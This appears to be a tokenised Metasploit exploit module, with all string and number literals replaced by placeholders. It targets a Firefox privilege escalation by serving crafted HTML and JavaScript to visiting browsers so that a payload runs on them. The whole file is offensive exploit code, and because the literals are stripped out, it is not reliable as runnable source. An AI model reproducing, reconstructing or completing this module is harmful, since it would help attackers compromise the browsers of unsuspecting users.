require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ManualRanking include Msf :: Exploit :: Remote :: BrowserExploitServer include Msf :: Exploit :: Remote :: FirefoxPrivilegeEscalation def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > [ [ <str> , { <str> = > <str> , <str> = > ARCH_FIREFOX } ] , [ <str> , { <str> = > <str> , <str> = > ARCH_ALL } ] ] , <str> = > <int> , <str> = > { <str> = > <str> , <str> = > HttpClients :: FF , <str> = > lambda { | ver | ver . to_i . between? ( <int> , <int> ) } } ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) end def on_request_exploit ( cli , request , target_info ) print_status ( <str> ) send_response_html ( cli , html ) end def html <str> datastore [ <str> ] || default_html <str> + <str> js <str> end def default_html <str> end def js key = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) frame = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) r = Rex :: Text . rand_text_alpha ( <int> + rand ( <int> ) ) opts = { key = > run_payload } <<- <str> EOJS <str> <str> EOJS end end 
